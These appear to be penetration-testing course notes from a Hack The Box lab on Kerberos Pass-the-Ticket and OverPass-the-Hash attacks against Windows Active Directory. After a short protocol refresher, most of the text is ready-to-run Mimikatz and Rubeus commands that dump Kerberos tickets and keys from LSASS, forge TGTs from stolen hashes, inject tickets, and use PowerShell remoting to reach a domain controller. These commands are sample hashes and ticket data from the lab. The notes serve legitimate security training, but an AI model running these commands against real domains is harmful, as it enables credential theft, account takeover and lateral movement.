- In a PtT attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
- We need a valid ticket(TGT or TGS) to perform the attack.

### Kerberos Protocol Refresher
- Instead of giving account passwords to every service, Kerberos uses tickets
	- **TGT - Ticket Granting Ticket** - The first ticket obtained. The TGT permits the client to obtain additional tickets, or TGS.
	- **TGS - Ticket Granting Service** - is requested by users who want to use a service. These tickets allow services to verify the user's identity.
- When a user requests a TGT, they authenticate to the DC by encrypting the current timestamp with their password hash.
	- Once the DC validates the user's identity, it sends the user a TGT. Once the user has their ticket, they don't need to authenticate with their password again.
- If the user wants to access an MSSQL database:
	- The user sends a Ticket Granting Service request to the Key Distribution Center (KDC) and presents its TGT.
	- Then it will give the TGS to the database for authentication.


### Harvesting Kerberos Tickets from Windows

#### **!! The following assumes local admin privs !!**

#### Mimikatz
- On Windows, tickets are processed and stored by the LSASS.
	- We can harvest all tickets from a system using Mimikatz module `sekurlsa:tickets /export`. The result is a list of files with the extension `.kirbi` which contains the tickets
``` cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
- Tickets that end with `$` are for the computer account.
- Tickets have the users name followed by an `@` to separate the service name and the domain
	- `[randomvalue]-username@service-domain.local.kirbi`
	- If a ticket has the service `krbtgt` it corresponds to the TGT of that account.


#### Rubeus
- `Rubeus.exe dump /nowrap` - will print the tickets encoded in base64 format.
	- `/nowrap` makes it easier to copy-paste

### Pass the Key or OverPass the Hash
- This approach converts a hash/key for a domain-joined user into a full TGT
- To forge our tickets, we need to have the user's hash.
``` cmd
mimikatz.exe
privilege::debug

		sekurlsa::ekeys
```
![[2023-03-28 19_54_53-Hack The Box - Academy.png|600]]
- Once we have the AES256_HMAC and RC4_HMAC key we can perform the attack with Mimikatz or Rubeus.
	- Explaination of the difference between the two functions is availble [here](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
#### Mimikatz - Pass the Key / OverPass the Hash 
```
sekurlsa::pth /domain:<domain> /user:plaintext /ntlm:<AES256/RC4_HMAC>
```
- **Requires Admin**

#### Rubeus - Pass the Key / OverPass the Hash 
 - We use the Rubeus module `asktgt`
	 - We can pass in a hash of types
		 - `/rc4`
		 - `/aes128`
		 - `/aes256`
		 - `/des`
``` cmd
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
- **Does NOT require admin**

**Note:** Modern Windows (2008+) use AES by default in Kerberos exchanges. If we use rc4_hmac (NTLM) instead of aes256 or 128 it may be detected as an "encryption downgrade."

## Pass The Ticket (PtT)

#### Rubeus - Pass the Ticket via Key Hash
``` cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
#### Rubeus - Pass the Ticket via .kirbi from Mimikatz
``` cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
#### Convert .kirbi to Base64
``` powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
#### Rubeus - Pass the Ticket - Base 64
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```
#### MimiKatz - Pass the Ticket
- mimikatz.exe
- privilege::debug
``` cmd
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
**Note:** Use the Mimikatz command `misc::cmd` to launch a new terminal with the imported ticket.


## Pass the Ticket with PowerShell Remoting

### Mimikatz - Pass the Ticket for Lateral Movement
- Open a new cmd.exe and run mimikatz.exe
	- `mimikatz.exe`
	- `privilege::debug`
- Then import the ticket we collected using `sekurlsa::tickets /export`
	- `kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"`
- Then launch a new cmd and launch a new Powershell prompt
- Use `Enter-PSSession` to connect to the target machine
	- `Enter-PSSession -ComputerName DC01`

### Rubeus - PowerShell Remoting with Pass the Ticket
- Rubeus has the optionÂ `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)).
	- This is hidden by default but use `/show` to display the process.
- The result is the equivalent of `runas /netonly`
	- This prevents the erasure of existing TGTs for the current logon session

``` cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
- This will open a new cmd window. We can use that to have Rubeus request a new TGT with the option `/ptt` to import the ticket into our session and connect to the DC with powershell remoting
``` cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
Then we can launch powershell and use `Enter-PSSession -ComputerName DC01`